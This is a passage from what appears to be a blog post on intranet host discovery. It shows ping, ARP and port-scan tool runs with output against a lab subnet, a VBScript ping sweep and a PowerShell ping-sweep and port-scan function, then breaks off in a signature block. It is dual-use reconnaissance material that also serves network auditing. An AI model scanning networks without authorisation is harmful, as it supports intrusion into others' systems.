class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell">tcping.exe -n 1 192.168.7.7 445<br><br>Probing 192.168.7.7:445/tcp - Port is open - time=1.719ms<br>Ping statistics for 192.168.7.7:445<br>     1 probes sent.<br>     1 successful, 0 failed.  (0.00% fail)<br>Approximate trip times in milli-seconds:<br>     Minimum = 1.719ms, Maximum = 1.719ms, Average = 1.719ms<br></code></pre></td></tr></table></figure><h3 id="scanline"><a href="#scanline" class="headerlink" title="scanline"></a>scanline</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs shell">scanline.exe -n 192.168.7.0-255<br>ScanLine (TM) 1.01<br>Copyright (c) Foundstone, Inc. 2002<br>http://www.foundstone.com<br>Scan of 256 IPs started at Tue Feb 23 22:07:40 2021<br>-------------------------------------------------------------------------------<br>192.168.7.7<br>Responded in 0 ms.<br>0 hops away<br>Responds with ICMP unreachable: No<br>-------------------------------------------------------------------------------<br>192.168.7.107<br>Responded in 0 ms.<br>0 hops away<br>Responds with ICMP unreachable: No<br>-------------------------------------------------------------------------------<br>192.168.7.110<br>Responded in 0 ms.<br>0 hops away<br>Responds with ICMP unreachable: No<br>-------------------------------------------------------------------------------<br>Scan finished at Tue Feb 23 22:07:49 2021<br>3 IPs and 0 ports scanned in 0 hours 0 mins 9.16 secs<br></code></pre></td></tr></table></figure><h3 id="ARP"><a href="#ARP" class="headerlink" title="ARP"></a>ARP</h3><p><a href="https://github.com/QbsuranAlang/arp-scan-windows-">arp-scan-windows</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell">arp-scan.exe -t 192.168.7.0/24<br>Reply that 16:7D:DA:D7:8F:64 is 192.168.7.1 in 11.278300<br>Reply that 00:0C:29:1D:82:CF is 192.168.7.7 in 16.140500<br>Reply that 00:0C:29:A9:62:98 is 192.168.7.107 in 15.233500<br>Reply that 00:0C:29:DC:01:0D is 192.168.7.110 in 0.080700<br>Reply that 00:0C:29:DC:01:0D is 192.168.7.255 in 0.071500<br></code></pre></td></tr></table></figure><h3 id="vbs"><a href="#vbs" class="headerlink" title="vbs"></a>vbs</h3><figure class="highlight vbs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs vbs">strSubNet = <span class="hljs-string">&quot;192.168.7.&quot;</span><br><span class="hljs-keyword">Set</span> objFSO= <span class="hljs-built_in">CreateObject</span>(<span class="hljs-string">&quot;Scripting.FileSystemObject&quot;</span>)<br><span class="hljs-keyword">Set</span> objTS = objfso.CreateTextFile(<span class="hljs-string">&quot;C:\Result.txt&quot;</span>)<br><span class="hljs-keyword">For</span> i = <span class="hljs-number">1</span> <span class="hljs-keyword">To</span> <span class="hljs-number">254</span><br>strComputer = strSubNet &amp; i<br>blnResult = Ping(strComputer)<br><span class="hljs-keyword">If</span> blnResult = <span class="hljs-literal">True</span> <span class="hljs-keyword">Then</span><br>objTS.WriteLine strComputer &amp; <span class="hljs-string">&quot; is alived ! :) &quot;</span><br><span class="hljs-keyword">End</span> <span class="hljs-keyword">If</span><br><span class="hljs-keyword">Next</span><br>objTS.Close<br>WScript.Echo <span class="hljs-string">&quot;All Ping Scan , All Done ! :) &quot;</span><br><span class="hljs-keyword">Function</span> Ping(strComputer)<br><span class="hljs-keyword">Set</span> objWMIService = <span class="hljs-built_in">GetObject</span>(<span class="hljs-string">&quot;winmgmts:\\.\root\cimv2&quot;</span>)<br><span class="hljs-keyword">Set</span> colItems = objWMIService.ExecQuery(<span class="hljs-string">&quot;Select * From Win32_PingStatus Where Address=&#x27;&quot;</span> &amp; strComputer &amp; <span class="hljs-string">&quot;&#x27;&quot;</span>)<br><span class="hljs-keyword">For</span> <span class="hljs-keyword">Each</span> objItem <span class="hljs-keyword">In</span> colItems<br><span class="hljs-keyword">Select</span> <span class="hljs-keyword">case</span> objItem.StatusCode<br><span class="hljs-keyword">Case</span> <span class="hljs-number">0</span><br>Ping = <span class="hljs-literal">True</span><br><span class="hljs-keyword">Case</span> <span class="hljs-keyword">Else</span><br>Ping = <span class="hljs-literal">False</span><br><span class="hljs-keyword">End</span> <span class="hljs-keyword">select</span><br><span class="hljs-keyword">Exit</span> <span class="hljs-keyword">For</span><br><span class="hljs-keyword">Next</span><br><span class="hljs-keyword">End</span> <span class="hljs-keyword">Function</span><br></code></pre></td></tr></table></figure><h3 id="powershell"><a href="#powershell" class="headerlink" title="powershell"></a>powershell</h3><p><code>Invoke-TSPingSweep.ps1</code></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Invoke-TSPingSweep</span></span> &#123;<br>  <span class="hljs-comment">&lt;#</span><br><span class="hljs-comment">    <span class="hljs-doctag">.SYNOPSIS</span></span><br><span class="hljs-comment">    Scan IP-Addresses, Ports and HostNames</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    <span class="hljs-doctag">.DESCRIPTION</span></span><br><span class="hljs-comment">    Scan for IP-Addresses, HostNames and open Ports in your Network.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    <span class="hljs-doctag">.PARAMETER StartAddress</span></span><br><span class="hljs-comment">    StartAddress Range</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    <span class="hljs-doctag">.PARAMETER EndAddress</span></span><br><span class="hljs-comment">    EndAddress Range</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    <span class="hljs-doctag">.PARAMETER ResolveHost</span></span><br><span class="hljs-comment">    Resolve HostName</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    <span class="hljs-doctag">.PARAMETER ScanPort</span></span><br><span class="hljs-comment">    Perform a PortScan</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    <span class="hljs-doctag">.PARAMETER Ports</span></span><br><span class="hljs-comment">    Ports That should be scanned, default values are: 21,22,23,53,69,71,80,98,110,139,111,</span><br><span class="hljs-comment">    389,443,445,1080,1433,2001,2049,3001,3128,5222,6667,6868,7777,7878,8080,1521,3306,3389,</span><br><span class="hljs-comment">    5801,5900,5555,5901</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    <span class="hljs-doctag">.PARAMETER TimeOut</span></span><br><span class="hljs-comment">    Time (in MilliSeconds) before TimeOut, Default set to 100</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    <span class="hljs-doctag">.EXAMPLE</span></span><br><span class="hljs-comment">    Invoke-TSPingSweep -StartAddress 192.168.0.1 -EndAddress 192.168.0.254</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    <span class="hljs-doctag">.EXAMPLE</span></span><br><span class="hljs-comment">    Invoke-TSPingSweep -StartAddress 192.168.0.1 -EndAddress 192.168.0.254 -ResolveHost</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    <span class="hljs-doctag">.EXAMPLE</span></span><br><span class="hljs-comment">    Invoke-TSPingSweep -StartAddress 192.168.0.1 -EndAddress 192.168.0.254 -ResolveHost -ScanPort</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    <span class="hljs-doctag">.EXAMPLE</span></span><br><span class="hljs-comment">    Invoke-TSPingSweep -StartAddress 192.168.0.1 -EndAddress 192.168.0.254 -ResolveHost -ScanPort -TimeOut 500</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    <span class="hljs-doctag">.EXAMPLE</span></span><br><span class="hljs-comment">    Invoke-TSPingSweep -StartAddress 192.168.0.1 -EndAddress 192.168.10.254 -ResolveHost -ScanPort -Port 80</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    <span class="hljs-doctag">.LINK</span></span><br><span class="hljs-comment">    http://www.truesec.com</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    <span class="hljs-doctag">.NOTES</span></span><br><span class="hljs-comment">    Goude 2012, TrueSec</span><br><span class="hljs-comment">  #&gt;</span><br>  <span class="hljs-keyword">Param</span>(<br>    [<span class="hljs-type">parameter</span>(<span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$true</span>,<br>      <span class="hljs-type">Position</span> = <span class="hljs-number">0</span>)]<br>    [<span class="hljs-type">ValidatePattern</span>(<span class="hljs-string">&quot;\b\d&#123;1,3&#125;\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;\b&quot;</span>)]<br>    [<span class="hljs-built_in">string</span>]<span class="hljs-variable">$StartAddress</span>,<br>    [<span class="hljs-type">parameter</span>(<span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$true</span>,<br>      <span class="hljs-type">Position</span> = <span class="hljs-number">1</span>)]<br>    [<span class="hljs-type">ValidatePattern</span>(<span class="hljs-string">&quot;\b\d&#123;1,3&#125;\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;\b&quot;</span>)]<br>    [<span class="hljs-built_in">string</span>]<span class="hljs-variable">$EndAddress</span>,<br>    [<span class="hljs-type">switch</span>]<span class="hljs-variable">$ResolveHost</span>,<br>    [<span class="hljs-type">switch</span>]<span class="hljs-variable">$ScanPort</span>,<br>    [<span class="hljs-built_in">int</span>[]]<span class="hljs-variable">$Ports</span> = <span class="hljs-selector-tag">@</span>(<span class="hljs-number">21</span>,<span class="hljs-number">22</span>,<span class="hljs-number">23</span>,<span class="hljs-number">53</span>,<span class="hljs-number">69</span>,<span class="hljs-number">71</span>,<span class="hljs-number">80</span>,<span class="hljs-number">98</span>,<span class="hljs-number">110</span>,<span class="hljs-number">139</span>,<span class="hljs-number">111</span>,<span class="hljs-number">389</span>,<span class="hljs-number">443</span>,<span class="hljs-number">445</span>,<span class="hljs-number">1080</span>,<span class="hljs-number">1433</span>,<span class="hljs-number">2001</span>,<span class="hljs-number">2049</span>,<span class="hljs-number">3001</span>,<span class="hljs-number">3128</span>,<span class="hljs-number">5222</span>,<span class="hljs-number">6667</span>,<span class="hljs-number">6868</span>,<span class="hljs-number">7777</span>,<span class="hljs-number">7878</span>,<span class="hljs-number">8080</span>,<span class="hljs-number">1521</span>,<span class="hljs-number">3306</span>,<span class="hljs-number">3389</span>,<span class="hljs-number">5801</span>,<span class="hljs-number">5900</span>,<span class="hljs-number">5555</span>,<span class="hljs-number">5901</span>),<br>    [<span class="hljs-built_in">int</span>]<span class="hljs-variable">$TimeOut</span> = <span class="hljs-number">100</span><br>  )<br>  <span class="hljs-keyword">Begin</span> &#123;<br>    <span class="hljs-variable">$ping</span> = <span class="hljs-built_in">New-Object</span> System.Net.Networkinformation.Ping<br>  &#125;<br>  <span class="hljs-keyword">Process</span> &#123;<br>    <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$a</span> <span class="hljs-keyword">in</span> (<span class="hljs-variable">$StartAddress</span>.Split(<span class="hljs-string">&quot;.&quot;</span>)[<span class="hljs-number">0</span>]..<span class="hljs-variable">$EndAddress</span>.Split(<span class="hljs-string">&quot;.&quot;</span>)[<span class="hljs-number">0</span>])) &#123;<br>      <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$b</span> <span class="hljs-keyword">in</span> (<span class="hljs-variable">$StartAddress</span>.Split(<span class="hljs-string">&quot;.&quot;</span>)[<span class="hljs-number">1</span>]..<span class="hljs-variable">$EndAddress</span>.Split(<span class="hljs-string">&quot;.&quot;</span>)[<span class="hljs-number">1</span>])) &#123;<br>        <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$c</span> <span class="hljs-keyword">in</span> (<span class="hljs-variable">$StartAddress</span>.Split(<span class="hljs-string">&quot;.&quot;</span>)[<span class="hljs-number">2</span>]..<span class="hljs-variable">$EndAddress</span>.Split(<span class="hljs-string">&quot;.&quot;</span>)[<span class="hljs-number">2</span>])) &#123;<br>          <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$d</span> <span class="hljs-keyword">in</span> (<span class="hljs-variable">$StartAddress</span>.Split(<span class="hljs-string">&quot;.&quot;</span>)[<span class="hljs-number">3</span>]..<span class="hljs-variable">$EndAddress</span>.Split(<span class="hljs-string">&quot;.&quot;</span>)[<span class="hljs-number">3</span>])) &#123;<br>            <span class="hljs-built_in">write-progress</span> <span class="hljs-literal">-activity</span> PingSweep <span class="hljs-literal">-status</span> <span class="hljs-string">&quot;<span class="hljs-variable">$a</span>.<span class="hljs-variable">$b</span>.<span class="hljs-variable">$c</span>.<span class="hljs-variable">$d</span>&quot;</span> <span class="hljs-literal">-percentcomplete</span> ((<span class="hljs-variable">$d</span>/(<span class="hljs-variable">$EndAddress</span>.Split(<span class="hljs-string">&quot;.&quot;</span>)[<span class="hljs-number">3</span>])) * <span class="hljs-number">100</span>)<br>            <span class="hljs-variable">$pingStatus</span> = <span class="hljs-variable">$ping</span>.Send(<span class="hljs-string">&quot;<span class="hljs-variable">$a</span>.<span class="hljs-variable">$b</span>.<span class="hljs-variable">$c</span>.<span class="hljs-variable">$d</span>&quot;</span>,<span class="hljs-variable">$TimeOut</span>)<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$pingStatus</span>.Status <span class="hljs-operator">-eq</span> <span class="hljs-string">&quot;Success&quot;</span>) &#123;<br>              <span class="hljs-keyword">if</span>(<span class="hljs-variable">$ResolveHost</span>) &#123;<br>                <span class="hljs-built_in">write-progress</span> <span class="hljs-literal">-activity</span> ResolveHost <span class="hljs-literal">-status</span> <span class="hljs-string">&quot;<span class="hljs-variable">$a</span>.<span class="hljs-variable">$b</span>.<span class="hljs-variable">$c</span>.<span class="hljs-variable">$d</span>&quot;</span> <span class="hljs-literal">-percentcomplete</span> ((<span class="hljs-variable">$d</span>/(<span class="hljs-variable">$EndAddress</span>.Split(<span class="hljs-string">&quot;.&quot;</span>)[<span class="hljs-number">3</span>])) * <span class="hljs-number">100</span>) <span class="hljs-literal">-Id</span> <span class="hljs-number">1</span><br>                <span class="hljs-variable">$getHostEntry</span> = [<span class="hljs-type">Net.DNS</span>]::BeginGetHostEntry(<span class="hljs-variable">$pingStatus</span>.Address, <span class="hljs-variable">$null</span>, <span class="hljs-variable">$null</span>)<br>              &#125;<br>              <span class="hljs-keyword">if</span>(<span class="hljs-variable">$ScanPort</span>) &#123;<br>                <span class="hljs-variable">$openPorts</span> = <span class="hljs-selector-tag">@</span>()<br>                <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">1</span>; <span class="hljs-variable">$i</span> <span class="hljs-operator">-le</span> <span class="hljs-variable">$ports</span>.Count;<span class="hljs-variable">$i</span>++) &#123;<br>                  <span class="hljs-variable">$port</span> = <span class="hljs-variable">$Ports</span>[(<span class="hljs-variable">$i</span>-<span class="hljs-number">1</span>)]<br>                  <span class="hljs-built_in">write-progress</span> <span class="hljs-literal">-activity</span> PortScan <span class="hljs-literal">-status</span> <span class="hljs-string">&quot;<span class="hljs-variable">$a</span>.<span class="hljs-variable">$b</span>.<span class="hljs-variable">$c</span>.<span class="hljs-variable">$d</span>&quot;</span> <span class="hljs-literal">-percentcomplete</span> ((<span class="hljs-variable">$i</span>/(<span class="hljs-variable">$Ports</span>.Count)) * <span class="hljs-number">100</span>) <span class="hljs-literal">-Id</span> <span class="hljs-number">2</span><br>                  <span class="hljs-variable">$client</span> = <span class="hljs-built_in">New-Object</span> System.Net.Sockets.TcpClient<br>                  <span class="hljs-variable">$beginConnect</span> = <span class="hljs-variable">$client</span>.BeginConnect(<span class="hljs-variable">$pingStatus</span>.Address,<span class="hljs-variable">$port</span>,<span class="hljs-variable">$null</span>,<span class="hljs-variable">$null</span>)<br>                  <span class="hljs-keyword">if</span>(<span class="hljs-variable">$client</span>.Connected) &#123;<br>                    <span class="hljs-variable">$openPorts</span> += <span class="hljs-variable">$port</span><br>                  &#125; <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-comment"># Wait</span><br>                    <span class="hljs-built_in">Start-Sleep</span> <span class="hljs-literal">-Milli</span> <span class="hljs-variable">$TimeOut</span><br>                    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$client</span>.Connected) &#123;<br>                      <span class="hljs-variable">$openPorts</span> += <span class="hljs-variable">$port</span><br>                    &#125;<br>                  &#125;<br>                  <span class="hljs-variable">$client</span>.Close()<br>                &#125;<br>              &#125;<br>              <span class="hljs-keyword">if</span>(<span class="hljs-variable">$ResolveHost</span>) &#123;<br>                <span class="hljs-variable">$hostName</span> = ([<span class="hljs-type">Net.DNS</span>]::EndGetHostEntry([<span class="hljs-type">IAsyncResult</span>]<span class="hljs-variable">$getHostEntry</span>)).HostName<br>              &#125;<br>              <span class="hljs-comment"># Return Object</span><br>              <span class="hljs-built_in">New-Object</span> PSObject <span class="hljs-literal">-Property</span> <span class="hljs-selector-tag">@</span>&#123;<br>                IPAddress = <span class="hljs-string">&quot;<span class="hljs-variable">$a</span>.<span class="hljs-variable">$b</span>.<span class="hljs-variable">$c</span>.<span class="hljs-variable">$d</span>&quot;</span>;<br>                HostName = <span class="hljs-variable">$hostName</span>;<br>                Ports = <span class="hljs-variable">$openPorts</span><br>              &#125; | <span class="hljs-built_in">Select-Object</span> IPAddress, HostName, Ports<br>            &#125;<br>          &#125;<br>        &#125;<br>      &#125;<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">End</span> &#123;<br>  &#125;<br>&#125;<br><span class="hljs-comment"># SIG # Begin signature block</span><br><span class="hljs-comment"># MIINGAYJKoZIhvcNAQcCoIINCTCCDQUCAQExCzAJBgUrDgMCGgUAMGkGCisGAQQB</span><br><span class="hljs-comment"># gjcCAQSgWzBZMDQGCisGAQQBgjcCAR4wJgIDAQAABBAfzDtgWUsITrck0sYpfvNR</span><br><span class="hljs-comment"># AgEAAgEAAgEAAgEAAgEAMCEwCQYFKw4DAhoFAAQUDtjslARLrEIY+LjC2tihCYoE</span><br><span class="hljs-comment"># ax2gggpaMIIFIjCCBAqgAwIBAgIQAupQIxjzGlMFoE+9rHncOTANBgkqhkiG9w0B</span><br><span class="hljs-comment"># AQsFADByMQswCQYDVQQGEwJVUzEVMBMGA1UEChMMRGlnaUNlcnQgSW5jMRkwFwYD</span><br><span class="hljs-comment"># VQQLExB3d3cuZGlnaWNlcnQuY29tMTEwLwYDVQQDEyhEaWdpQ2VydCBTSEEyIEFz</span><br><span class="hljs-comment"># c3VyZWQgSUQgQ29kZSBTaWduaW5nIENBMB4XDTE0MDcxNzAwMDAwMFoXDTE1MDcy</span><br><span class="hljs-comment"># MjEyMDAwMFowaTELMAkGA1UEBhMCQ0ExCzAJBgNVBAgTAk9OMREwDwYDVQQHEwhI</span><br><span class="hljs-comment"># YW1pbHRvbjEcMBoGA1UEChMTRGF2aWQgV2F5bmUgSm9obnNvbjEcMBoGA1UEAxMT</span><br><span class="hljs-comment"># RGF2aWQgV2F5bmUgSm9obnNvbjCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoC</span><br><span class="hljs-comment"># ggEBAM3+T+61MoGxUHnoK0b2GgO17e0sW8ugwAH966Z1JIzQvXFa707SZvTJgmra</span><br><span class="hljs-comment"># ZsCn9fU+i9KhC0nUpA4hAv/b1MCeqGq1O0f3ffiwsxhTG3Z4J8mEl5eSdcRgeb+1</span><br><span class="hljs-comment"># jaKI3oHkbX+zxqOLSaRSQPn3XygMAfrcD/QI4vsx8o2lTUsPJEy2c0z57e1VzWlq</span><br><span class="hljs-comment"># KHqo18lVxDq/YF+fKCAJL57zjXSBPPmb/sNj8VgoxXS6EUAC5c3tb+CJfNP2U9vV</span><br><span class="hljs-comment"># oy5YeUP9bNwq2aXkW0+xZIipbJonZwN+bIsbgCC5eb2aqapBgJrgds8cw8WKiZvy</span><br><span class="hljs-comment"># Zx2qT7hy9HT+LUOI0l0K0w31dF8CAwEAAaOCAbswggG3MB8GA1UdIwQYMBaAFFrE</span><br><span class="hljs-comment"># uXsqCqOl6nEDwGD5LfZldQ5YMB0GA1UdDgQWBBTnMIKoGnZIswBx8nuJckJGsFDU</span><br><span class="hljs-comment"># lDAOBgNVHQ8BAf8EBAMCB4AwEwYDVR0lBAwwCgYIKwYBBQUHAwMwdwYDVR0fBHAw</span><br><span class="hljs-comment"># bjA1oDOgMYYvaHR0cDovL2NybDMuZGlnaWNlcnQuY29tL3NoYTItYXNzdXJlZC1j</span><br><span class="hljs-comment"># cy1nMS5jcmwwNaAzoDGGL2h0dHA6Ly9jcmw0LmRpZ2ljZXJ0LmNvbS9zaGEyLWFz</span><br><span class="hljs-comment"># c3VyZWQtY3MtZzEuY3JsMEIGA1UdIAQ7MDkwNwYJYIZIAYb9bAMBMCowKAYIKwYB</span><br><span class="hljs-comment"># BQUHAgEWHGh0dHBzOi8vd3d3LmRpZ2ljZXJ0LmNvbS9DUFMwgYQGCCsGAQUFBwEB</span><br><span class="hljs-comment"># BHgwdjAkBggrBgEFBQcwAYYYaHR0cDovL29jc3AuZGlnaWNlcnQuY29tME4GCCsG</span><br><span class="hljs-comment"># AQUFBzAChkJodHRwOi8vY2FjZXJ0cy5kaWdpY2VydC5jb20vRGlnaUNlcnRTSEEy</span><br><span class="hljs-comment"># QXNzdXJlZElEQ29kZVNpZ25pbmdDQS5jcnQwDAYDVR0TAQH/BAIwADANBgkqhkiG</span><br><span class="hljs-comment"># 9w0BAQsFAAOCAQEAVlkBmOEKRw2O66aloy9tNoQNIWz3AduGBfnf9gvyRFvSuKm0</span><br><span class="hljs-comment"># Zq3A6lRej8FPxC5Kbwswxtl2L/pjyrlYzUs+XuYe9Ua9YMIdhbyjUol4Z46jhOrO</span><br><span class="hljs-comment"># TDl18txaoNpGE9JXo8SLZHibwz97H3+paRm16aygM5R3uQ0xSQ1NFqDJ53YRvOqT</span><br><span class="hljs-comment"># 60/tF9E8zNx4hOH1lw1CDPu0K3nL2PusLUVzCpwNunQzGoZfVtlnV2x4EgXyZ9G1</span><br><span class="hljs-comment"># x4odcYZwKpkWPKA4bWAG+Img5+dgGEOqoUHh4jm2IKijm1jz7BRcJUMAwa2Qcbc2</span><br><span class="hljs-comment"># ttQbSj/7xZXL470VG3WjLWNWkRaRQAkzOajhpTCCBTAwggQYoAMCAQICEAQJGBtf</span><br><span class="hljs-comment"># 1btmdVNDtW+VUAgwDQYJKoZIhvcNAQELBQAwZTELMAkGA1UEBhMCVVMxFTATBgNV</span><br><span class="hljs-comment"># BAoTDERpZ2lDZXJ0IEluYzEZMBcGA1UECxMQd3d3LmRpZ2ljZXJ0LmNvbTEkMCIG</span><br><span class="hljs-comment"># A1UEAxMbRGlnaUNlcnQgQXNzdXJlZCBJRCBSb290IENBMB4XDTEzMTAyMjEyMDAw</span><br><span class="hljs-comment"># MFoXDTI4MTAyMjEyMDAwMFowcjELMAkGA1UEBhMCVVMxFTATBgNVBAoTDERpZ2lD</span><br><span class="hljs-comment"># ZXJ0IEluYzEZMBcGA1UECxMQd3d3LmRpZ2ljZXJ0LmNvbTExMC8GA1UEAxMoRGln</span><br><span class="hljs-comment"># aUNlcnQgU0hBMiBBc3N1cmVkIElEIENvZGUgU2lnbmluZyBDQTCCASIwDQYJKoZI</span><br><span class="hljs-comment"># hvcNAQEBBQADggEPADCCAQoCggEBAPjTsxx/DhGvZ3cH0wsxSRnP0PtFmbE620T1</span><br><span class="hljs-comment"># f+Wondsy13Hqdp0FLreP+pJDwKX5idQ3Gde2qvCchqXYJawOeSg6funRZ9PG+ykn</span><br><span class="hljs-comment"># x9N7I5TkkSOWkHeC+aGEI2YSVDNQdLEoJrskacLCUvIUZ4qJRdQtoaPpiCwgla4c</span><br><span class="hljs-comment"># SocI3wz14k1gGL6qxLKucDFmM3E+rHCiq85/6XzLkqHlOzEcz+ryCuRXu0q16XTm</span><br><span class="hljs-comment"># K/5sy350OTYNkO/ktU6kqepqCquE86xnTrXE94zRICUj6whkPlKWwfIPEvTFjg/B</span><br><span class="hljs-comment"># ougsUfdzvL2FsWKDc0GCB+Q4i2pzINAPZHM8np+mM6n9Gd8lk9ECAwEAAaOCAc0w</span><br><span class="hljs-comment"># ggHJMBIGA1UdEwEB/wQIMAYBAf8CAQAwDgYDVR0PAQH/BAQDAgGGMBMGA1UdJQQM</span><br><span class="hljs-comment"># MAoGCCsGAQUFBwMDMHkGCCsGAQUFBwEBBG0wazAkBggrBgEFBQcwAYYYaHR0cDov</span><br><span class="hljs-comment"># 